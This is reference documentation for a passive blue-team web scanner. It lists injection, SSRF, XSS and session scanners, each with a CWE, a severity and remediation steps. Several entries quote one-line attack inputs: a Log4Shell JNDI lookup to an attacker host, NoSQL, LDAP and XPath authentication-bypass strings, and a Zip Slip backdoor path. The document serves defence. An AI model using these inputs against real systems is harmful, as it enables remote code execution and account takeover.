# Tblue Scanner Reference

In-depth reference for **405 of the 614 passive blue-team scanners** in Tblue. The remaining 209 ship and run, but do not yet have a long-form entry here — see `tblue --help` for the full module list.
Each entry explains what the scanner detects, why it is dangerous, and how to fix it.

> **Blue-team only.** Tblue is a passive detection tool — no active exploitation, no brute force,
> no destructive probing. Every scanner reads responses and reports findings without modifying state.

## Severity Guide

| Level | Meaning |
|---|---|
| 🔴 CRITICAL | Direct path to RCE, credential theft, or data breach. Fix immediately. |
| 🟠 HIGH | Significant security weakness; exploitable under common conditions. |
| 🟡 MEDIUM | Defence-in-depth gap; exploitable with additional preconditions. |
| 🟢 LOW | Best-practice deviation; low direct risk but hardens attack surface. |
| ℹ️ INFO | Informational — may leak context that assists an attacker during reconnaissance. |

## Table of Contents

- [Critical Injection & RCE (20 scanners)](#user-content-critical-injection--rce)
- [SSRF & Request Forgery (6 scanners)](#user-content-ssrf--request-forgery)
- [Cross-Site Scripting (XSS) (9 scanners)](#user-content-cross-site-scripting-xss)
- [Authentication & Session (15 scanners)](#user-content-authentication--session)
- [Authorization & Access Control (18 scanners)](#user-content-authorization--access-control)
- [OAuth, SAML & Identity (10 scanners)](#user-content-oauth-saml--identity)
- [CSRF & Clickjacking (8 scanners)](#user-content-csrf--clickjacking)
- [HTTP Headers & Transport (28 scanners)](#user-content-http-headers--transport)
- [Cookies (6 scanners)](#user-content-cookies)
- [TLS & Cryptography (5 scanners)](#user-content-tls--cryptography)
- [Supply Chain & Dependencies (8 scanners)](#user-content-supply-chain--dependencies)
- [Secrets & Information Disclosure (14 scanners)](#user-content-secrets--information-disclosure)
- [GraphQL (7 scanners)](#user-content-graphql)
- [API Security (4 scanners)](#user-content-api-security)
- [Cloud & Infrastructure (4 scanners)](#user-content-cloud--infrastructure)
- [DNS & Network (8 scanners)](#user-content-dns--network)
- [Injection (Other) (9 scanners)](#user-content-injection-other)
- [WebSockets & Real-Time (8 scanners)](#user-content-websockets--real-time)
- [Browser APIs & Web Platform (78 scanners)](#user-content-browser-apis--web-platform)
- [Service Workers & Caching (9 scanners)](#user-content-service-workers--caching)
- [JavaScript & Prototype (23 scanners)](#user-content-javascript--prototype)
- [CSS & UI Security (19 scanners)](#user-content-css--ui-security)
- [DOM & Web Components (40 scanners)](#user-content-dom--web-components)
- [Privacy & Fingerprinting (11 scanners)](#user-content-privacy--fingerprinting)
- [Iframe & Cross-Origin (9 scanners)](#user-content-iframe--cross-origin)
- [Email & Miscellaneous (13 scanners)](#user-content-email--miscellaneous)
- [Other Scanners (16 scanners)](#user-content-other-scanners)

---

## Critical Injection & RCE

*20 scanners in this category.*

### 1. OS Command Injection
**Module:** `command_injection` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-78**

Unsanitized input passed to shell gives attackers remote code execution (RCE) Metacharacters (; | && $() backticks) allow arbitrary command chaining Full server compromise: read /etc/shadow, install backdoors, pivot internally

**How to fix:**
- Never pass user input to shell=True subprocess calls or os.system()
- Use parameterized subprocess with a fixed argv list — no shell interpolation
- Run application processes as a least-privilege non-shell user

---

### 2. Server-Side Template Injection (SSTI)
**Module:** `ssti` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-94**

SSTI in Jinja2, Twig, Freemarker gives RCE with server-level code execution Template sandbox escapes allow filesystem access and subprocess spawning Credentials and env vars accessible via template engine introspection

**How to fix:**
- Never render user input as template code — only pass it as template variables
- Use SandboxedEnvironment (Jinja2) as defense-in-depth
- Audit all template rendering calls for dynamic template string construction

---

### 3. Insecure Deserialization
**Module:** `deserialization` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-502**

Malicious serialized payloads trigger RCE via gadget chains during deserialization Java, PHP, Python pickle, and .NET binary formatters are all susceptible DoS via Billion Laughs / recursive objects; auth bypass via tampered session blobs

**How to fix:**
- Never deserialize data from untrusted sources
- Use safe formats (JSON with strict schema validation) instead of native serialization
- Implement HMAC signing on serialized session data
- For Java: deploy RASP / agent-based deserialization attack detection

---

### 4. Insecure Deserialization Gadget Indicators
**Module:** `deserialization_gadget_passive` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-502** &nbsp;|&nbsp; **MITRE:** T1059

Detects passive indicators of insecure deserialization: PHP serialized object signatures in responses (O:N:"Class" returned to clients enables object injection), Java serialized stream magic bytes (aced0005/rO0AB enables RCE via Apache Commons Collections gadget chains), Python pickle calls with user input (arbitrary code execution via __reduce__), PHP unserialize() from HTTP parameters (magic method chain exploitation), unsafe YAML loading, and known gadget class names in error messages.

**How to fix:**
- Never deserialize data from untrusted sources without cryptographic verification
- Use safe serialization formats (JSON) instead of native object serialization
- For Java: use allowlisting with ObjectInputFilter; remove Apache Commons Collections from classpath
- For PHP: avoid unserialize() on user input; use json_decode() instead
- For Python: use yaml.safe_load() instead of yaml.load(); avoid pickle for user data

**References:** [↗](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data) · [↗](https://cwe.mitre.org/data/definitions/502.html)

---

### 5. Insecure Deserialization Indicators
**Module:** `insecure_deserialization_passive` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-502**

Java serialized objects in cookies/params enable RCE via gadget chains (Apache Commons) PHP object serialization (O:N:) in user input allows property injection attacks ViewState without MAC validation allows forged state leading to RCE in ASP.NET

**How to fix:**
- Never deserialize user-supplied data with native object deserialization formats
- Enable ViewStateMac and ViewStateEncryptionMode in ASP.NET applications
- For Java: use SerialKiller or RASP to block known gadget chain classes

---

### 6. Log4Shell / JNDI Injection (CVE-2021-44228)
**Module:** `log4shell_passive` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-917**

Log4Shell allows unauthenticated RCE via JNDI lookup injection in any logged string (User-Agent, headers, form fields) Attack works against Log4j 2.0-beta9 through 2.17.0 — one of the most widely exploited CVEs in history A single HTTP request with ${jndi:ldap://attacker.com/a} in any logged field is sufficient to exploit Exposed log4j config files reveal logging destinations and internal hostnames

**How to fix:**
- Upgrade Log4j to 2.17.1+ (Java 8), 2.12.4+ (Java 7), or 2.3.2+ (Java 6) immediately
- Interim: set -Dlog4j2.formatMsgNoLookups=true JVM flag to disable JNDI lookups
- Block outbound LDAP/RMI connections from web application JVMs at the egress firewall
- Remove Log4j version strings from all response headers

---

### 7. LaTeX Injection (Passive Detection)
**Module:** `latex_injection_passive` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-94** &nbsp;|&nbsp; **MITRE:** T1059

Detects LaTeX injection indicators: \write18 and \immediate\write18 shell escape commands (OS command execution when pdflatex is run with --shell-escape), \input{/etc/...} file inclusion patterns (local file disclosure via generated PDFs), LaTeX commands receiving URL parameters as arguments, and LaTeX engine error messages that fingerprint the rendering system.

**How to fix:**
- Never pass user input directly into LaTeX source documents
- Disable shell escape: run pdflatex without --shell-escape flag
- Use sandboxed LaTeX rendering environments (Docker, seccomp) with no filesystem access
- Allowlist permitted LaTeX commands and reject \input, \include, \write18 from user content

**References:** [↗](https://owasp.org/www-community/attacks/Code_Injection) · [↗](https://cwe.mitre.org/data/definitions/94.html)

---

### 8. NoSQL Injection (Advanced MongoDB/Redis Detection)
**Module:** `nosql_injection_advanced` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-943** &nbsp;|&nbsp; **MITRE:** T1190

Detects NoSQL injection patterns: MongoDB $where operator receiving URL parameters (server-side JavaScript execution; authorization bypass), query operators ($gt/$ne/$regex) sourced from req.body (attacker sends {password:{$ne:null}} to bypass authentication), .find() receiving raw req.body as query selector (no sanitization; operator injection), .aggregate() with user-controlled pipeline stages (joins sensitive collections, enumerates records), mapReduce() with user input (MongoDB JavaScript execution), and database error disclosure (MongoError/CastError reveals schema and field names).

**How to fix:**
- Never pass req.body or URL parameters directly to MongoDB query selectors
- Disable $where and JavaScript execution in MongoDB: security.javascriptEnabled: false
- Use mongoose Schema validation with strict mode to reject unknown operators
- Allowlist permitted query operators; reject $where, $function, $accumulator
- Suppress database error details from API responses

**References:** [↗](https://owasp.org/www-project-web-security-testing-guide/) · [↗](https://cwe.mitre.org/data/definitions/943.html)

---

### 9. XML External Entity Injection (Advanced)
**Module:** `xml_external_entity_advanced` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-611** &nbsp;|&nbsp; **MITRE:** T1190

Detects XXE indicators in HTTP responses: DOCTYPE with SYSTEM entities referencing file:// or http:// URLs (local file disclosure and SSRF), parameter entities for blind out-of-band exfiltration, XML parser error messages that fingerprint the parsing engine, SSI directives alongside XML contexts, and DOMParser.parseFromString calls with user-controlled input.

**How to fix:**
- Disable external entity processing in your XML parser (DocumentBuilderFactory.setFeature for Java, libxml2 LIBXML_NONET for PHP)
- Use data formats that don't support entity references (JSON) where possible
- Validate and reject DOCTYPE declarations in user-supplied XML
- Never expose XML parser error messages in production responses

**References:** [↗](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) · [↗](https://cwe.mitre.org/data/definitions/611.html)

---

### 10. Client-Side Command Injection (Node.js/Electron)
**Module:** `command_injection_client_security` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-78** &nbsp;|&nbsp; **MITRE:** T1059

Detects OS command injection patterns in client-side JavaScript applications (Node.js, Electron) where exec()/spawn()/execSync() receive URL parameter values or string-concatenated user input, spawn with shell:true enables metacharacter interpretation, and command output is exfiltrated via network requests.

**How to fix:**
- Never pass user input directly to exec()/spawn()/execSync() in Electron/Node.js apps
- Use spawn() with argument arrays (not shell strings) and shell:false
- Validate and allowlist all values used in shell commands
- Avoid shell:true — it enables interpretation of ; | && and other metacharacters

**References:** [↗](https://owasp.org/www-community/attacks/Command_Injection) · [↗](https://cwe.mitre.org/data/definitions/78.html)

---

### 11. XML External Entity (XXE) Injection
**Module:** `xxe_injection` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-611**

XXE reads arbitrary server-side files via DOCTYPE/ENTITY declarations Blind XXE exfiltrates file contents via out-of-band DNS/HTTP callbacks SSRF via XXE probes internal network services

**How to fix:**
- Disable external entity processing in your XML parser (DTD off)
- For Java: set XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES to false
- Use JSON instead of XML where possible — eliminate the attack surface

---

### 12. XXE Passive Indicators
**Module:** `xxe_passive` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-611**

External entity processing enabled in XML parser allows file read and SSRF Parameter entity injection in DTD declarations allows exfiltrating data out-of-band Server echoes back injected entity content confirming exploitable XXE

**How to fix:**
- Disable DOCTYPE declarations globally in the XML parser configuration
- Use FEATURE_EXTERNAL_GENERAL_ENTITIES=false and FEATURE_EXTERNAL_PARAMETER_ENTITIES=false
- Prefer JSON APIs over XML where possible to eliminate the attack surface

---

### 13. Server-Side Template Injection (Passive Detection)
**Module:** `server_side_template_passive` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-94** &nbsp;|&nbsp; **MITRE:** T1190

Passively detects indicators of Server-Side Template Injection (SSTI) in HTTP responses: reflected template expressions with math operations (7*7) or config/self references, template engine error messages (TemplateSyntaxError, Twig_Error) that reveal engine type and version, and server headers that fingerprint the template engine (Werkzeug, Flask, Django) enabling targeted payload selection.

**How to fix:**
- Never render user input as template source — always treat it as data
- Use auto-escaping template engines and keep it enabled
- Suppress template engine error details in production responses
- Remove or generalize Server/X-Powered-By headers to avoid engine fingerprinting

**References:** [↗](https://portswigger.net/research/server-side-template-injection) · [↗](https://cwe.mitre.org/data/definitions/94.html)

---

### 14. LDAP Injection (Passive Detection)
**Module:** `ldap_injection_passive` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-90** &nbsp;|&nbsp; **MITRE:** T1190

Detects LDAP injection indicators: search filters constructed from URL parameters (attacker injects * | & ! to modify filter logic; (&(uid=admin)(pass=*))(|(uid=*)) bypasses authentication), LDAP filters built by string concatenation with user input (no parameterized API used), .bind() with user-controlled credentials (anonymous or impersonated bind via empty string or foreign DN injection), LDAP error messages revealing directory structure, and Distinguished Names in response bodies exposing internal directory topology.

**How to fix:**
- Use parameterized LDAP search APIs; never build filter strings by string concatenation
- Escape LDAP special characters (* ( ) \ NUL) from user input using RFC 4515/4514 escaping
- Use least-privilege LDAP service accounts that cannot read sensitive attributes
- Suppress LDAP error details from application responses

**References:** [↗](https://owasp.org/www-community/attacks/LDAP_Injection) · [↗](https://cwe.mitre.org/data/definitions/90.html)

---

### 15. XPath/LDAP Injection (Passive Detection)
**Module:** `xpath_injection_passive` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-643**

XPathException in response: confirms XPath query construction from user input — auth bypass possible LDAP error disclosed: LDAP filter uses untrusted input — attacker crafts filter to extract all accounts XML parse error from user input: XXE or injection may be possible in XML processing pipeline XPath auth bypass: ' or '1'='1 in username/password field bypasses XPath-based authentication XQuery injection: dynamic XQuery construction enables data extraction from XML database

**How to fix:**
- Use parameterized XPath queries (never string-concatenate user input into XPath expressions)
- Sanitize all inputs used in XPath: escape single quotes, apostrophes, and XPath metacharacters
- Use LDAP filter escaping libraries (e.g., org.apache.directory.api.ldap.model.filter)
- Catch and swallow all XPath/XML/LDAP exceptions — never expose to client
- Implement allowlist validation on inputs used in XML/XPath queries

**References:** [↗](https://owasp.org/www-community/attacks/XPATH_Injection)

---

### 16. XPath Injection via User Input
**Module:** `xpath_injection_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-643** &nbsp;|&nbsp; **MITRE:** T1059

Detects XPath expressions constructed from URL parameters or string concatenation with user input, XPathResult exfiltration, and boolean injection patterns (or '1'='1', nested predicates) in evaluated expressions.

**How to fix:**
- Never build XPath expressions from user input or URL parameters — use parameterized XPath where available
- Validate and allowlist XPath node names and values before use in expressions
- Do not transmit XPathResult data to remote analytics endpoints
- Sanitize input to prevent XPath metacharacter injection (quotes, brackets, operators)

**References:** [↗](https://owasp.org/www-community/attacks/XPATH_Injection) · [↗](https://cwe.mitre.org/data/definitions/643.html)

---

### 17. LDAP Injection via User Input
**Module:** `ldap_injection_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-90** &nbsp;|&nbsp; **MITRE:** T1078

Detects LDAP query construction from URL parameters, string concatenation with username/email in DN attributes (cn=, ou=), wildcard and boolean operator metacharacters in LDAP filters, and LDAP result exfiltration enabling directory traversal and authentication bypass.

**How to fix:**
- Use parameterized LDAP queries or escape all special characters (*, (, ), \, NUL) in user input
- Never concatenate user-supplied values directly into LDAP filter strings or DNs
- Validate input against an allowlist of acceptable characters before use in LDAP queries
- Do not transmit LDAP search results to external endpoints

**References:** [↗](https://owasp.org/www-community/attacks/LDAP_Injection) · [↗](https://cwe.mitre.org/data/definitions/90.html)

---

### 18. Client-Side SQL Injection (Web SQL)
**Module:** `sql_injection_client_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-89** &nbsp;|&nbsp; **MITRE:** T1059.007

Detects SQL queries constructed from URL parameters or via string concatenation with user input (Web SQL Database / IndexedDB misuse), attacker-controlled database name in openDatabase(), and local database result exfiltration.

**How to fix:**
- Never build SQL queries via string concatenation with user input — use parameterized queries
- Never construct SQL from URL parameters — validate and sanitize all inputs
- Restrict access to Web SQL Database — avoid storing sensitive data client-side
- Do not transmit local database query results to remote endpoints

**References:** [↗](https://owasp.org/www-community/attacks/SQL_Injection) · [↗](https://cwe.mitre.org/data/definitions/89.html)

---

### 19. Client-Side Template Injection (SSTI)
**Module:** `template_injection_client_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-94** &nbsp;|&nbsp; **MITRE:** T1059

Detects client-side template injection in Handlebars/EJS where template strings or render contexts come from URL parameters, prototype chain access expressions ({{__proto__}}) in templates enabling sandbox escape, and sensitive data (password/token) exposed in template render contexts.

**How to fix:**
- Never pass URL parameters or user-supplied strings as template source to Handlebars.compile()/ejs.render()
- Validate and sanitize template context variables — never pass raw user input as context
- Configure Handlebars with allowedProtoMethods and allowedPrototypeMethods to block prototype access
- Do not include sensitive fields (password, token, secret) in template render contexts

**References:** [↗](https://portswigger.net/web-security/server-side-template-injection) · [↗](https://cwe.mitre.org/data/definitions/94.html)

---

### 20. Zip Slip Path Traversal in Archive Extraction
**Module:** `zip_slip_passive` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-22** &nbsp;|&nbsp; **MITRE:** T1190

Detects Zip Slip path traversal vulnerabilities in archive extraction code: Python zipfile.extractall() without path normalization (writes files to arbitrary filesystem paths; attacker-crafted ../../../../etc/cron.d/backdoor in zip), archive iteration without realpath/normpath validation (member.name used directly in file writes), ../ traversal sequences in archive member filenames detected in responses, Java ZipInputStream without canonicalPath check (extraction to server root possible), upload-then-extract patterns without member path sanitization, and os.path.join with untrusted archive member names (on Unix, a name starting with / causes os.path.join to ignore all prior components).

**How to fix:**
- Validate each archive member's path: os.path.realpath(os.path.join(dest, member.name)).startswith(dest)
- For Java: use File.getCanonicalPath() and verify it starts with the extraction destination
- Reject any member whose resolved path escapes the destination directory
- Use a hardened extraction library that handles path validation automatically
- Limit extraction to a temporary directory with quota enforcement

**References:** [↗](https://snyk.io/research/zip-slip-vulnerability) · [↗](https://cwe.mitre.org/data/definitions/22.html)

---

## SSRF & Request Forgery

*6 scanners in this category.*

### 21. Server-Side Request Forgery (SSRF)
**Module:** `ssrf_detection` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-918**

SSRF allows attackers to reach internal services that are not internet-accessible Internal network scanning via SSRF reveals topology and exposes admin interfaces Access to cloud metadata endpoints yields IAM credentials and environment secrets Can bypass IP allowlists via DNS rebinding or open redirect chains

**How to fix:**
- Validate URLs against an allowlist of permitted destinations before fetching
- Block RFC-1918 and link-local ranges (10.x, 172.16.x, 192.168.x, 169.254.x) at egress
- Use a dedicated HTTP proxy (Smokescreen) for all outbound requests
- Resolve DNS after allowlist check and re-validate the resolved IP

---

### 22. Advanced SSRF Bypass
**Module:** `ssrf_advanced` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-918**

DNS rebinding bypasses IP-based SSRF filters by returning internal IPs post-validation IPv6 / octal / hex encoding of 169.254.169.254 evades naive blocklists HTTP redirect chains allow SSRF filters to be bypassed in a single hop

**How to fix:**
- Re-validate the resolved IP on every redirect — TOCTOU-safe check required
- Normalize and canonicalize all URLs before validation; reject non-standard encodings
- Use a purpose-built SSRF prevention proxy (Smokescreen by Stripe)

---

### 23. SSRF Passive Indicators
**Module:** `ssrf_passive` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-918**

URL parameters (url, src, fetch, proxy) passed unsanitized to server-side HTTP clients Internal proxy/render endpoints reachable from the internet without authentication SSRF via metadata IP (169.254.169.254) echoed in error responses confirms reachability

**How to fix:**
- Validate all user-supplied URLs against a strict allowlist before server-side fetching
- Block RFC-1918 and link-local ranges at the egress firewall for web application processes
- Require authentication on all /fetch, /proxy, /render, /screenshot, /pdf endpoints

---

### 24. Cloud Instance Metadata SSRF
**Module:** `cloud_metadata` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-918**

SSRF to 169.254.169.254 returns temporary cloud credentials (IAM role tokens) Stolen credentials allow full pivot across the cloud environment (EC2, S3, RDS, Lambda) AWS IMDSv1 is unauthenticated — any SSRF reaches it without token negotiation Metadata API also exposes SSH keys, startup scripts, and environment variables

**How to fix:**
- Enforce IMDSv2 (token-required mode) on all EC2 instances
- Block the 169.254.169.254 range at the VPC security group level for web-facing services
- Validate and allowlist all user-supplied URLs before making server-side HTTP requests
- Use Smokescreen or a dedicated egress proxy with metadata IP blocked

---

### 25. DNS Rebinding Risk
**Module:** `dns_rebinding_passive` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-346**

DNS rebinding bypasses SOP — attacker site resolves to internal IP after allowlist check Localhost/private IP references in responses confirm internal service reachability Arbitrary Host headers accepted without validation — precondition for DNS rebinding attacks

**How to fix:**
- Validate Host header against a strict allowlist; reject requests with unexpected Host values
- Implement DNS rebinding protection: check Referer and Origin on all sensitive endpoints
- Use IMDSv2 on cloud instances to require token-based metadata access

---

### 26. HTTP Request Smuggling (Passive Detection)
**Module:** `http_request_smuggling` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-444** &nbsp;|&nbsp; **MITRE:** T1190

Passively detects response patterns indicating HTTP request smuggling vulnerabilities: simultaneous Transfer-Encoding and Content-Length headers (TE/CL or CL/TE desync), obfuscated Transfer-Encoding values that bypass front-end parsing, proxy headers combined with chunked encoding, and duplicate Content-Length headers. These mismatches between front-end proxies and back-end servers allow attackers to poison the request pipeline.

**How to fix:**
- Ensure front-end and back-end servers interpret HTTP headers identically
- Reject ambiguous requests with both Transfer-Encoding and Content-Length
- Use HTTP/2 end-to-end where possible to eliminate HTTP/1.1 parsing ambiguity
- Keep proxy and web server software updated to current patched versions

**References:** [↗](https://portswigger.net/web-security/request-smuggling) · [↗](https://cwe.mitre.org/data/definitions/444.html)

---

## Cross-Site Scripting (XSS)

*9 scanners in this category.*

### 27. CSS Injection (Style-Based Attacks)
**Module:** `css_injection_passive` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79** &nbsp;|&nbsp; **MITRE:** T1059

Detects CSS injection indicators: IE expression() and behavior: directives that execute JavaScript in legacy/Electron environments, url('javascript:') in CSS properties, @import url() built from URL parameters (attacker-controlled external stylesheets enabling CSS exfiltration attacks), style= attributes containing URL parameter values (UI redressing, data exfiltration via background-image requests), and CSS attribute selector exfiltration gadgets that leak form field values character by character.

**How to fix:**
- Never inject URL parameters directly into style= attributes or stylesheet content
- Use a strict Content Security Policy that blocks inline styles and external stylesheets
- Sanitize user input to remove CSS-dangerous characters (<, >, (, ), :, ;)
- Disable expression() evaluation — use modern browsers and frameworks that ignore it

**References:** [↗](https://owasp.org/www-project-web-security-testing-guide/) · [↗](https://cwe.mitre.org/data/definitions/79.html)

---

### 28. srcdoc/iframe Injection Vulnerability
**Module:** `srcdoc_injection` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79**

javascript: iframe src: script executes in parent page context regardless of CSP if not blocked srcdoc with embedded <script>: script runs in null origin; CSP frame-src 'none' doesn't block srcdoc srcdoc from URL param: attacker controls iframe content via URL manipulation — stored/reflected XSS data:text/html iframe: in older browsers executes in parent origin; modern browsers sandbox varies Blob URL iframes: dynamic HTML content loaded via createObjectURL may contain attacker-controlled data

**How to fix:**
- Set Content-Security-Policy: frame-src 'self' and sandbox on all iframes using srcdoc
- Add sandbox attribute to all iframes — allow-scripts only when absolutely necessary
- Never assign srcdoc from URL parameters, location.search, or any user-controlled source
- Set X-Frame-Options: DENY or CSP frame-ancestors 'none' on sensitive pages
- Validate and sanitize any content placed in srcdoc using DOMPurify or equivalent

**References:** [↗](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-srcdoc)

---

### 29. SVG Security — Scripts and Event Handlers
**Module:** `svg_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79**

SVG with embedded <script>: executes in page origin when rendered inline or as standalone document SVG event handler attributes (onload, onclick): fire JavaScript without explicit script tags <foreignObject> embeds arbitrary HTML inside SVG — common XSS bypass technique External <use href> loads from attacker-controlled SVG sprite files User-uploaded SVGs served without Content-Disposition: attachment render with script execution SMIL animation event handlers (onbegin, onend) fire JavaScript from animation lifecycle

**How to fix:**
- Sanitize SVGs using DOMPurify or svgo with trusted types configuration before serving
- Serve user-uploaded SVGs with Content-Disposition: attachment; filename=file.svg
- Reject SVG uploads containing <script>, event handlers, or <foreignObject>
- Serve SVGs from a separate sandboxed origin (e.g., static.example.com)
- Add CSP img-src and object-src restrictions to limit SVG rendering contexts

---

### 30. JavaScript Template Literal Injection (DOM XSS)
**Module:** `javascript_template_literal` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79**

eval() with interpolated template: attacker controls template expression, executes arbitrary JS in page context innerHTML from template literal: DOM XSS — attacker injects HTML/script via URL parameter document.write() with template: script/HTML injection when interpolated value is user-controlled window.location from template: open redirect if URL component interpolated from user input script.src from template: attacker controls loaded script URL, achieves arbitrary code execution

**How to fix:**
- Never use eval() with template literals containing user-controlled interpolation
- Use textContent instead of innerHTML for user-controlled content; DOMPurify for HTML
- Sanitize all URL components before interpolating into window.location assignments
- Implement Content-Security-Policy with script-src to block unauthorized scripts
- Use Trusted Types API to enforce safe DOM sinks at the browser level

**References:** [↗](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)

---

### 31. Trusted Types Policy Bypass / DOM XSS
**Module:** `trusted_types_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79**

Default policy override: createPolicy('default') replaces the browser's built-in TT enforcement — all unsafe sinks become allowed globally HTML passthrough policy: createHTML callback returns input unchanged — sanitization is completely bypassed despite TT enforcement Script passthrough policy: createScript returns input unchanged — arbitrary code execution bypasses TT script sink protection innerHTML from URL parameter: DOM XSS sink assigned from location.searchParams without TrustedHTML wrapper — TT headers present but bypassed in code eval alongside Trusted Types: eval() or new Function() used in same codebase — bypasses TT's protection of script sinks

**How to fix:**
- Never create a 'default' named policy — it overrides the browser enforcement globally
- Ensure createHTML/createScript callbacks perform real sanitization (DOMPurify etc.) not identity transforms
- Always wrap URL parameter content in a TrustedHTML value before assigning to innerHTML/outerHTML
- Pair Trusted Types API with require-trusted-types-for 'script' CSP header
- Eliminate eval() and new Function() — use Trusted Types to block dynamic code execution sinks

**References:** [↗](https://w3c.github.io/trusted-types/dist/spec/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)

---

### 32. Sanitizer API Misconfiguration / XSS Bypass
**Module:** `sanitizer_api_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79**

Allowlist includes script: allowElements containing 'script' completely defeats XSS protection Event handler attributes allowed: allowAttributes with 'onclick'/'onload' enables inline event handler XSS injection Untrusted input to setHTML: URL parameter or external content passed directly to setHTML() without validation No explicit sanitizer config: setHTML() without Sanitizer instance uses default config which may permit dangerous content Href/src without protocol filter: allowing href/src attributes without blocking data:/javascript: enables XSS via attribute injection

**How to fix:**
- Never include 'script' in Sanitizer allowElements — this defeats all sanitization
- Exclude all on* event handler attributes from Sanitizer allowAttributes
- Validate and sanitize input before passing to setHTML() — Sanitizer is a second layer, not first defense
- Always pass an explicit Sanitizer instance to setHTML() with a strict allowlist
- Implement Content Security Policy as a defense-in-depth measure alongside Sanitizer API

**References:** [↗](https://wicg.github.io/sanitizer-api/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API)

---

### 33. DOMParser / XMLSerializer Security
**Module:** `dom_parser_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-79**

DOMParser.parseFromString() parses HTML/XML from URL parameter: attacker-controlled HTML injection bypassing innerHTML sanitization DOMParser.parseFromString() result passed to eval()/Function(): parsed DOM script content executed as JavaScript XMLSerializer.serializeToString() result transmitted via fetch/sendBeacon: full DOM subtree exfiltrated as serialized XML/HTML string DOMParser.parseFromString() processes HTML containing <script>/event handlers: XSS via DOMParser injection pattern

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/DOMParser) · [↗](https://cwe.mitre.org/data/definitions/79.html)

---

### 34. Trusted Types Not Enforced
**Module:** `trusted_types_policy` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-79**

Without require-trusted-types-for 'script' in CSP, dangerous DOM sinks (innerHTML, document.write) accept raw strings enabling DOM XSS Trusted Types API used without CSP enforcement is advisory only — violations are not blocked unsafe-eval in CSP alongside Trusted Types partially defeats DOM XSS protection Trusted Types set via meta http-equiv CSP is not enforced by browsers — HTTP header required

**How to fix:**
- Add require-trusted-types-for 'script' to the enforcing Content-Security-Policy HTTP header
- Define allowed Trusted Types policy names with the trusted-types directive
- Replace direct innerHTML/document.write usage with Trusted Types policies
- Remove unsafe-eval from CSP; refactor any eval() usage to avoid string-based code execution

---

### 35. Trusted Types CSP Not Enforced
**Module:** `trusted_types_csp` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-79**

DOM XSS sinks without Trusted Types: innerHTML/eval/document.write allow arbitrary string injection without platform-level validation Trusted Types API used without CSP enforcement: opt-in usage bypassed by any legacy code path that skips createPolicy() No trusted-types allowlist: any policy name can be created, defeating the purpose of named policy control Third-party scripts bypass Trusted Types: external libraries that use DOM sinks bypass your own policy if CSP isn't enforced globally Missing Trusted Types enables stored XSS escalation: without sink-level enforcement, XSS payloads survive sanitization gaps

**How to fix:**
- Add 'require-trusted-types-for script' to CSP — this forces all DOM sinks to accept only TrustedHTML/TrustedScript objects
- Define a 'trusted-types' allowlist in CSP: 'trusted-types policy-name' restricts which policies can be created
- Migrate innerHTML usage to textContent for text, or use TrustedHTML from a strict createPolicy() for HTML
- Use the Trusted Types violation report endpoint to identify and fix non-compliant code before enforcing in report-only mode
- Audit third-party scripts for DOM sink usage — wrap in a Trusted Types-aware integration layer

**References:** [↗](https://w3c.github.io/trusted-types/dist/spec/) · [↗](https://web.dev/trusted-types/)

---

## Authentication & Session

*15 scanners in this category.*

### 36. Session Fixation / Hijacking
**Module:** `session_fixation_security` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-384** &nbsp;|&nbsp; **MITRE:** T1539

Detects session ID acceptance from URL parameters (session fixation), document.cookie injection from URL parameters, sessionStorage/localStorage session value from URL, and active session token exfiltration via fetch/sendBeacon.

**How to fix:**
- Never accept session IDs from URL parameters — always generate session IDs server-side
- Regenerate session ID after successful authentication (prevents fixation)
- Never set document.cookie from URL parameter values
- Restrict session cookie transmission — use HttpOnly, Secure, and SameSite=Strict

